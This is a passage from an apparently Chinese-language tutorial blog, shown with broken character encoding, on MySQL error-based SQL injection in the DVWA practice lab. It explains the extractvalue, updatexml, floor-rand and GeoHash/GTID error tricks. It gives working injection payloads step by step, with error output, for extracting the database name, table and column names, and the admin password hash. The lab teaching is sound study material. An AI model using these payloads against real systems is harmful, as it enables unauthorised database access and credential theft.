<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~dvwa~&#39;
</span></span></code></pre></div><p><strong>æˆ‘ä»¬ä½¿ç”¨äº†<code>database()</code>å‡½æ•°ï¼Œè€Œsqlä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè¿”å›å‡½æ•°ç»“æœï¼Œå°±å¸¦å‡ºäº†æ•°æ®åº“åç§°</strong></p>
<h4 id="updatexml-xml_document-xpath_string-new_value">updatexml (XML_document, XPath_string, new_value)
</h4><ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°ï¼š<code>XML_document</code> æ˜¯ç›®æ ‡XMLæ–‡æ¡£</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ï¼š<code>XPath_string</code> <strong>æ˜¯è¯¥XMLæ–‡æ¡£çš„è·¯å¾„ï¼Œå¦‚æœå†™å…¥å…¶ä»–æ ¼å¼å°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”è¿”å›éæ³•æ ¼å¼çš„å†…å®¹</strong></li>
<li>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼š<code>new_value</code> ç”¨æ¥æ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)#
</span></span></code></pre></div><p>ä¹Ÿæ˜¯åŒç†ä¼šæŠ¥é”™</p>
<p><span style="color:#fab920;font-size:20px"><strong>ä¹‹åçš„æ¼”ç¤ºæˆ‘ä¼šä»¥<code>updatexml()</code>å’Œ<code>extractvalue()</code>ä¸ºä¸»</strong></span></p>
<p><span style="color:#fab920;font-size:20px"><strong>ä½†åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘è¿˜æƒ³ä»‹ç»ä¸€äº›å…¶ä»–çš„å¥½ç©çš„å‡½æ•°(å½“ç„¶ä¹Ÿå¾ˆæœ‰ç”¨!ï¼‰ğŸ‘‡</strong></span></p>
<h3 id="ä¸é‚£ä¹ˆå¸¸ç”¨çš„å‡½æ•°">ä¸é‚£ä¹ˆå¸¸ç”¨çš„å‡½æ•°
</h3><h4 id="floorå‡½æ•°8xmysql50">floorå‡½æ•°(8.x&gt;mysql&gt;5.0ï¼‰
</h4><p><strong><code>floor()</code>ï¼šå¯¹ç»“æœå–æ•´ï¼ˆå‘ä¸‹èˆå…¥ï¼‰</strong></p>
<p>è¿™ä¸æ˜¯ä¸€ä¸ªå•ç‹¬ä½¿ç”¨çš„å‡½æ•°ï¼Œè€Œæ˜¯éœ€è¦ä¸<code>rand()</code>, <code>count(*)</code>å’Œ<code>group by</code>ç»“åˆä½¿ç”¨ï¼Œæ¥è§¦å‘<strong>ä¸»é”®é‡å¤é”™è¯¯</strong>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">from</span> 
</span></span><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#c678dd">count</span>(<span style="color:#56b6c2">*</span>),<span style="color:#e06c75">concat</span>((<span style="color:#c678dd">select</span> <span style="color:#c678dd">database</span>()),<span style="color:#e06c75">floor</span>(<span style="color:#e06c75">rand</span>(<span style="color:#d19a66">0</span>)<span style="color:#56b6c2">*</span><span style="color:#d19a66">2</span>))<span style="color:#e06c75">x</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">information_schema</span>.<span style="color:#e06c75">tables</span> <span style="color:#c678dd">group</span> <span style="color:#c678dd">by</span> <span style="color:#e06c75">x</span>)<span style="color:#e06c75">a</span>)
</span></span><span style="display:flex;"><span>								      â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘
</span></span><span style="display:flex;"><span>	è¿™é‡Œæ’å…¥ä½ æƒ³è¿›è¡Œçš„æŸ¥è¯¢è¯­å¥ï¼Œåªèƒ½æœ‰ä¸€ä¸ªè¿”å›å€¼ï¼Œå› ä¸º<span style="color:#e06c75">concatå‡½æ•°å€¼åªæ¥å—å•å€¼</span>ï¼Œæœ€å¥½ä½¿ç”¨<span style="color:#e06c75">limitè¯­å¥</span>ï¼Œæ¯”å¦‚ï¼š
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">from</span> 
</span></span><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#c678dd">count</span>(<span style="color:#56b6c2">*</span>),<span style="color:#e06c75">concat</span>((<span style="color:#c678dd">select</span> <span style="color:#c678dd">table_name</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">information_schema</span>.<span style="color:#e06c75">tables</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">table_schema</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;dvwa&#39;</span> <span style="color:#c678dd">limit</span> <span style="color:#d19a66">0</span>,<span style="color:#d19a66">1</span>),<span style="color:#e06c75">floor</span>(<span style="color:#e06c75">rand</span>(<span style="color:#d19a66">0</span>)<span style="color:#56b6c2">*</span><span style="color:#d19a66">2</span>))<span style="color:#e06c75">x</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">information_schema</span>.<span style="color:#e06c75">tables</span> <span style="color:#c678dd">group</span> <span style="color:#c678dd">by</span> <span style="color:#e06c75">x</span>)<span style="color:#e06c75">a</span>)
</span></span></code></pre></div><p>ç°åœ¨ï¼Œæˆ‘ä»¬è¾“å…¥è¿™æ ·çš„æ³¨å…¥è¯­å¥ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)#
</span></span></code></pre></div><p>æˆ‘ä»¬çœ‹çœ‹æ¯ä¸€ä¸ªéƒ¨åˆ†çš„ä½œç”¨ï¼š</p>
<ul>
<li>
<p><strong><code>floor(rand(0)\*2)</code></strong></p>
<p><code>rand()</code>å‡½æ•°ä¼šäº§ç”Ÿä¸€ä¸ª0åˆ°1ä¹‹é—´çš„éšæœºæ•°ã€‚ä½†å½“ç»™å®ƒä¸€ä¸ªå›ºå®šçš„ç§å­ï¼ˆseedï¼‰ï¼Œå¦‚<code>0</code>æ—¶ï¼Œå®ƒäº§ç”Ÿçš„â€œéšæœºæ•°â€åºåˆ—å°±å˜æˆ<strong>å®Œå…¨å¯é¢„æµ‹</strong>çš„äº†</p>
<p>æœ€ç»ˆï¼Œ<strong><code>floor(rand(0)*2)</code>ä¼šç¨³å®šåœ°äº§ç”Ÿè¿™æ ·ä¸€ä¸ªåºåˆ—ï¼š<code>0, 1, 1, 0, 1, 1, 0, ...</code></strong></p>
</li>
<li>
<p><strong><code>concat((select database()), floor(rand(0)\*2))</code></strong></p>
<p>è¿™éƒ¨åˆ†å°†æˆ‘ä»¬è¦æŸ¥è¯¢çš„æ•°æ®ä¸ä¸Šé¢äº§ç”Ÿçš„<code>0</code>æˆ–<code>1</code>æ‹¼æ¥èµ·æ¥</p>
<p>å› æ­¤ï¼Œå®ƒä¼šç”Ÿæˆä¸€ç³»åˆ—çš„å­—ç¬¦ä¸²ï¼Œå¦‚ <code>'dvwa0'</code>, <code>'dvwa1'</code>, <code>'dvwa1'</code>, <code>'dvwa0'</code></p>
</li>
<li>
<p><strong><code>... from information_schema.tables group by x</code></strong></p>
<p><code>from information_schema.tables</code>ï¼šè¿™é‡Œåªæ˜¯ä¸ºäº†æä¾›è¶³å¤Ÿçš„æ•°æ®è¡Œï¼ˆè‡³å°‘3è¡Œï¼‰æ¥è®©<code>group by</code>æ“ä½œå¾—ä»¥è§¦å‘é”™è¯¯ï¼Œ<strong>ä»»ä½•è¡Œæ•°è¶³å¤Ÿçš„è¡¨éƒ½å¯ä»¥</strong>ã€‚</p>
<p><code>group by x</code>ï¼šè¿™æ˜¯è§¦å‘é”™è¯¯çš„å…³é”®ï¼Œå®ƒä¼šæ ¹æ®æˆ‘ä»¬ä¸Šé¢ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼ˆå¦‚<code>'dvwa0'</code>, <code>'dvwa1'</code>ï¼‰è¿›è¡Œåˆ†ç»„å’Œè®¡æ•°ã€‚</p>
</li>
<li>
<p><strong><code>select 1 from ...</code></strong></p>
<p>æŠŠè¿”å›ä¸¤åˆ—çš„å†…éƒ¨æŸ¥è¯¢åŒ…è£…æˆåªè¿”å›ä¸€åˆ—ï¼ˆå†…å®¹æ˜¯<code>1</code>ï¼‰çš„ã€è¯­æ³•æ­£ç¡®çš„å­æŸ¥è¯¢</p>
</li>
</ul>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</p>
<p><mark><strong>1.group byåœ¨æ‰§è¡Œæ—¶ï¼Œä¼šå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿçš„ä¸´æ—¶è¡¨ï¼Œç”¨äºå­˜æ”¾åˆ†ç»„çš„é”®(key)å’Œcount(*)è®¡æ•°å€¼</strong></mark></p>
<p><mark><strong>2.åœ¨æ‰§è¡Œæ’å…¥æ“ä½œå‰ï¼Œsqlä¼šå†æ¬¡æŸ¥è¯¢å½“å‰è¦æ’å…¥çš„é”®ï¼Œå› æ­¤rand()ä¼šå†æ¬¡æ‰§è¡Œ</strong></mark></p>
<p>ç°åœ¨æ¥çœ‹çœ‹é”™è¯¯æ˜¯æ€æ ·å‘ç”Ÿçš„ï¼š</p>
<ul>
<li>
<p><strong>é€è¡Œå¤„ç†</strong>ï¼š</p>
<p>ç¬¬ä¸€è¡Œï¼šè°ƒç”¨<code>rand()</code>ï¼Œè®¡ç®—å‡ºçš„é”®æ˜¯<code>'dvwa0'</code>ï¼Œä¸´æ—¶è¡¨ä¸­æ²¡æœ‰è¿™ä¸ªé”®ï¼Œsqlå‡†å¤‡æ’å…¥ï¼Œæ­¤æ—¶ç¬¬äºŒæ¬¡è°ƒç”¨<code>rand()</code>ï¼Œè®¡ç®—å‡º<code>'dvwa1'</code>æ’å…¥</p>
<p><strong>ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæƒ³æ’å…¥çš„æ˜¯0ï¼Œå´æ’å…¥äº†1ï¼‰</strong></p>
<p>ç¬¬äºŒè¡Œï¼šæ­¤æ—¶<code>rand()</code>ç¬¬ä¸‰æ¬¡è¢«è°ƒç”¨ï¼Œè®¡ç®—å‡ºçš„é”®æ˜¯<code>'dvwa1'</code>ï¼Œä¸´æ—¶è¡¨ä¸­å·²ç»æœ‰äº†ï¼Œä¸ç”¨æ’å…¥ï¼Œè®¡æ•°å€¼åŠ ä¸€å°±è¡Œ</p>
<p><strong>ï¼ˆæ³¨æ„ï¼šsqlè¿™é‡Œä¸€å¼€å§‹å°±æ²¡æœ‰æ‰“ç®—æ’å…¥ï¼Œè€Œæ˜¯é€‰æ‹©count+1ï¼‰</strong></p>
</li>
<li>
<p><strong>è§¦å‘é”™è¯¯</strong>ï¼š</p>
<p>ç¬¬ä¸‰è¡Œï¼šæ­¤æ—¶<code>rand()</code>ç¬¬å››æ¬¡è¢«è°ƒç”¨ï¼Œè®¡ç®—å‡ºçš„é”®æ˜¯<code>'dvwa0'</code>ï¼Œè¡¨é‡Œæ²¡æœ‰è¿™ä¸ªé”®ï¼Œæ‰€ä»¥sqlå‡†å¤‡æ’å…¥ï¼Œæ­¤æ—¶ç¬¬äº”æ¬¡è°ƒç”¨<code>rand()</code>ï¼Œè®¡ç®—å‡º<code>'dvwa1'</code>æ’å…¥</p>
<p>ç­‰ç­‰ï¼Œä¸å¯¹ï¼è¡¨é‡Œå·²ç»æœ‰<code>'dvwa1'</code>äº†ï¼</p>
<p>è¿™å°±å¯¼è‡´sqlå°è¯•æ’å…¥ä¸€ä¸ªå·²ç»å­˜åœ¨çš„é”®ï¼Œä»è€Œè§¦å‘äº†**â€œä¸»é”®é‡å¤â€ï¼ˆ<code>Duplicate entry</code>ï¼‰çš„é”™è¯¯ï¼š**</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Duplicate entry &#39;dvwa1&#39; for key &#39;group_key&#39;
</span></span></code></pre></div></li>
</ul>
<p><strong>è¿™æ ·ï¼Œå°±æŠŠæ•°æ®åº“åç§°å¸¦äº†å‡ºæ¥</strong></p>
<p><strong>åŒæ—¶ï¼Œæˆ‘ä»¬è¿˜èƒ½æ€»ç»“å‡ºè¿™æ ·çš„è§„å¾‹ï¼š</strong></p>
<p><span style="color:red;font-size:20px"><strong>å¯¹äºä¸€ä¸ªæ•´æ•°xé€šè¿‡floor(rand(x)*2)äº§ç”Ÿçš„åºåˆ—ï¼š</strong></span></p>
<p><span style="color:red;font-size:20px"><strong>å¦‚æœåœ¨æœªå‡ºç°<code>0011</code>æˆ–<code>1100</code>åºåˆ—å‰å‡ºç°<code>0010</code>æˆ–<code>1101</code>ï¼Œé‚£ä¹ˆè¯¥åºåˆ—å¯ç”¨äºæŠ¥é”™å‹sqlç›²æ³¨</strong></span></p>
<p>å‚è€ƒæ–‡æ¡£ï¼š<a class="link" href="https://blog.csdn.net/qq_35544379/article/details/77453019"  target="_blank" rel="noopener"
    >SQLæŠ¥é”™å‹ç›²æ³¨æ•™ç¨‹
    
    <span style="white-space: nowrap;"><svg width=".7em"
        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
            fill="currentColor">
    </svg></span>
    
</a></p>
<p>â€‹		<a class="link" href="https://www.secpulse.com/archives/140616.html"  target="_blank" rel="noopener"
    >å…³äºfloor()æŠ¥é”™æ³¨å…¥ï¼Œä½ çœŸçš„æ‡‚äº†å—ï¼Ÿ
    
    <span style="white-space: nowrap;"><svg width=".7em"
        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
            fill="currentColor">
    </svg></span>
    
</a></p>
<h4 id="st_latfromgeohashgeohash_string">ST_LatFromGeoHash(geohash_string)
</h4><p><strong>å‚æ•°æ˜¯ä¸€ä¸ªGeoHashæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæ ¼å¼ä¸å¯¹ï¼Œå‡½æ•°å°±ä¼šæŠ¥é”™ï¼Œå¹¶å¯èƒ½è¿”å›å¯¼è‡´é”™è¯¯çš„éæ³•å­—ç¬¦ä¸²</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))#
</span></span></code></pre></div><p>å’ŒXPath_stringä¸€æ ·ï¼Œ<code>~</code>ä¸æ˜¯GeoHashæ ¼å¼é‡Œé¢çš„åˆæ³•å­—ç¬¦ï¼Œå¦‚æœä½¿ç”¨å°±ä¼šæŠ¥é”™ï¼ŒåŒæ—¶å¸¦å‡ºæ•°æ®ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>FUNCTION dvwa.ST_LatFromGeoHash does not exist
</span></span><span style="display:flex;"><span>		           â†‘â†‘â†‘â†‘â†‘
</span></span></code></pre></div><h4 id="st_longfromgeohashgeohash_string">ST_LongFromGeoHash(geohash_string)
</h4><p><strong>åˆ©ç”¨åŸç†ä¸<code>ST_LatFromGeoHash</code>å®Œå…¨ç›¸åŒ</strong></p>
<h4 id="st_pointfromgeohashgeohash_string-srid">ST_PointFromGeoHash(geohash_string, srid)
</h4><p><strong>å¥½å§å’Œä¸Šé¢è¿˜æ˜¯ä¸€æ ·çš„</strong></p>
<h4 id="gtid_subsetsubset-set">GTID_SUBSET(subset, set)
</h4><ul>
<li>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼š <code>subset</code>ä¸€ä¸ªGTIDï¼ˆå…¨å±€äº‹åŠ¡æ ‡è¯†ç¬¦ï¼‰é›†åˆã€‚</p>
</li>
<li>
<p>ç¬¬äºŒä¸ªå‚æ•°ï¼š <code>set</code>å¦ä¸€ä¸ªGTIDé›†åˆã€‚</p>
</li>
</ul>
<p>ä¸€ä¸ªåˆæ³•çš„GTIDå•å…ƒç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œç”¨å†’å·éš”å¼€ï¼š<code>source_id:transaction_id</code></p>
<p><strong>å½“ä»»æ„ä¸€ä¸ªå‚æ•°ä¸æ˜¯åˆæ³•çš„GTIDé›†åˆæ ¼å¼æ—¶ï¼Œå‡½æ•°å°±ä¼šæŠ¥é”™ï¼Œå¹¶å¯èƒ½è¿”å›éæ³•å‚æ•°çš„å†…å®¹</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and GTID_SUBSET(database(), 1)#
</span></span></code></pre></div><p>æŠ¥é”™ç»“æœï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>FUNCTION dvwa.GTID_SUBSET does not exist
</span></span></code></pre></div><p><span style="color:#fab920;font-size:20px"><strong>å¥½å•¦ï¼Œå‡½æ•°ä»‹ç»å°±åˆ°æ­¤ä¸ºæ­¢ï¼Œä¸‹é¢æˆ‘ä»¬æ­£å¼å¼€å§‹æŠ¥é”™æ³¨å…¥çš„æ­¥éª¤ï¼</strong></span></p>
<h3 id="çˆ†ç ´æ•°æ®åº“åç§°">çˆ†ç ´æ•°æ®åº“åç§°
</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,database(),0x7e)) #
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #
</span></span></code></pre></div><p>å‡ºç°ä¸‹é¢æŠ¥é”™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~dvwa~&#39;
</span></span></code></pre></div><p>è¿™å°±å¾—åˆ°äº†æ•°æ®åº“çš„åç§°ï¼šdvwa</p>
<p>å¯èƒ½ä½ ä¼šæœ‰ç–‘æƒ‘ï¼Œä¸ºä»€ä¹ˆè¦ç”¨<code>~</code>åŒ…è£¹å†…å®¹å‘¢ï¼Ÿ</p>
<p>è¿™ä¸€æ–¹é¢æ˜¯æ–¹ä¾¿æˆ‘ä»¬çœ‹è¿”å›çš„ç»“æœï¼Œå¦ä¸€æ–¹é¢å˜›ï¼Œæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹</p>
<h3 id="çˆ†ç ´è¡¨å">çˆ†ç ´è¡¨å
</h3><p>ç”±äº extractvalue() æœ€å¤§è¿”å›é•¿åº¦ä¸º 32 ï¼Œæ‰€ä»¥æœ€å¥½ç”¨ limit N,1 ä¸€è¡Œä¸€è¡Œçš„è¿›è¡Œå›æ˜¾</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 0,1),0x7e)) #
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1),0x7e)) #
</span></span></code></pre></div><p>åˆ†åˆ«å‡ºç°ä¸‹é¢æŠ¥é”™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~guestbook~&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>XPATH syntax error: &#39;~users~&#39;
</span></span></code></pre></div><p>è€Œå¦‚æœä¸ç”¨limitè¯­å¥ï¼Œåˆ™ä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Subquery returns more than 1 row
</span></span></code></pre></div><p><strong>è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæ‰€ä»¥limitè¯­å¥å¾ˆé‡è¦ï¼</strong></p>
<h3 id="çˆ†ç ´åˆ—å">çˆ†ç ´åˆ—å
</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e)) #
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),0x7e)) #
</span></span></code></pre></div><p>åˆ†åˆ«å‡ºç°ä¸‹é¢æŠ¥é”™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~user~&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>XPATH syntax error: &#39;~password~&#39;
</span></span></code></pre></div><h3 id="çˆ†ç ´å­—æ®µå†…å®¹">çˆ†ç ´å­—æ®µå†…å®¹
</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select concat_ws(&#39;,&#39;,user,password) from users limit 0,1),0x7e)) #
</span></span></code></pre></div><p>å‡ºç°ä¸‹é¢çš„æŠ¥é”™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~admin,5f4dcc3b5aa765d61d8327deb&#39;
</span></span></code></pre></div><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†<code>concat_ws</code>å‡½æ•°ï¼ŒæŒ‡å®šæŠŠ<code>user</code>å’Œ<code>password</code>å­—æ®µä½¿ç”¨<code>,</code>æ‹¼æ¥å†è¿”å›ï¼Œè¿™æ ·å°±èƒ½å®ç°æŸ¥è¯¢å¤šåˆ—</p>
<p>å¦‚æœä¸ä½¿ç”¨ï¼Œå°±ä¼šå‡ºç°ä¸‹é¢çš„æŠ¥é”™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Operand should contain 1 column(s)
</span></span></code></pre></div><p>ç„¶è€Œï¼Œæ­£å¦‚ä¸Šé¢æ‰€è¯´ï¼Œ<code>extractvalue()</code> å‡½æ•°æœ€å¤§è¿”å›32ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ç°åœ¨å¾—åˆ°çš„å¹¶éå®Œæ•´çš„ä¿¡æ¯ï¼Œè¿™ä¸€ç‚¹æˆ‘ä»¬ä¹Ÿèƒ½ä»ç»“æœæœ«å°¾æ²¡æœ‰<code>~</code>çœ‹å‡ºæ¥**ï¼ˆæ‰€ä»¥ä¸¤è¾¹éƒ½åŠ <code>~</code>æ˜¯æ¯”è¾ƒæ˜æ™ºçš„é€‰æ‹©ï¼‰**</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬è¦é€‚å½“èˆå¼ƒä¸€äº›ä¸œè¥¿ï¼Œæ¯”å¦‚æŠŠadminå•ç‹¬æ‹¿å‡ºæ¥ï¼Œæˆ–è€…ä½¿ç”¨**<code>substring()</code>å‡½æ•°**</p>
<div class="alert alert-tip">
    <div class="alert-header">
        <span class="alert-icon">
            ğŸ’¡
        </span>
        <span class="alert-title">
            Tip
        </span>
    </div>
    <div class="alert-content">
        <p><strong><code>substring(strings,m,n)</code>ï¼šä»stringsçš„ç¬¬mä¸ªå­—ç¬¦å¼€å§‹ï¼Œå‘åæˆªå–nä¸ªå­—ç¬¦</strong></p>
<p><strong>1.<code>substring()</code>çš„å¼€å§‹ä½ç½®ä¸º1ï¼Œå’Œ<code>limit</code>ä¸ä¸€æ ·ï¼</strong></p>
<p><strong>2.é€šå¸¸<code>substr()</code>å¯ä»¥ä»£æ›¿å®ƒï¼Œç”¨æ³•ä¹Ÿç›¸åŒï¼›è€Œ<code>mid()</code>æ€»æ˜¯å¯ä»¥ä»£æ›¿å®ƒï¼Œå› ä¸ºå°±æ˜¯å®ƒçš„åˆ«å</strong></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼š<strong>substr()=substring()=mid()</strong></p></div>
</div>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&#39;,&#39;,user,password), 1, 30) from users limit 0,1),0x7e)) #
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1&#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&#39;,&#39;,user,password), 31, 30) from users limit 0,1),0x7e)) #
</span></span></code></pre></div><p>åˆ†åˆ«å¾—åˆ°ä¸‹é¢çš„æŠ¥é”™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>XPATH syntax error: &#39;~admin,5f4dcc3b5aa765d61d8327de~&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>XPATH syntax error: &#39;~b882cf99~&#39;
</span></span></code></pre></div><p>æ‹¼æ¥å¾—åˆ°å®Œæ•´çš„ç”¨æˆ·åå’Œå¯†ç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>admin,5f4dcc3b5aa765d61d8327deb882cf99
</span></span></code></pre></div><p><strong>åˆ©ç”¨<code>substring()</code>ï¼Œå³ä½¿å­—æ®µé•¿åº¦è¿œè¿œå¤§äº32ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½ä¸€ç‚¹ç‚¹å‡‘å‡ºå®Œæ•´çš„å†…å®¹</strong></p>
<h2 id="3-ç›²æ³¨">#3 ç›²æ³¨
</h2><p><strong>æœ‰çš„æ—¶å€™å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯å‰ç«¯å¹¶ä¸ä¼šå›æ˜¾æ³¨å…¥ç»“æœï¼Œè¿™å°±éœ€è¦ç”¨ç‰¹æ®Šæ–¹å¼åˆ¤æ–­æˆ‘ä»¬æ˜¯å¦æ³¨å…¥æˆåŠŸ</strong></p>
<h3 id="å¸¸ç”¨å‡½æ•°-2">å¸¸ç”¨å‡½æ•°
</h3><div class="table-wrapper"><table>
  <thead>
      <tr>
          <th style="text-align: center">å‡½æ•°</th>
          <th style="text-align: center">ç”¨æ³•</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center">mid/substr/substring(string, m, n)</td>
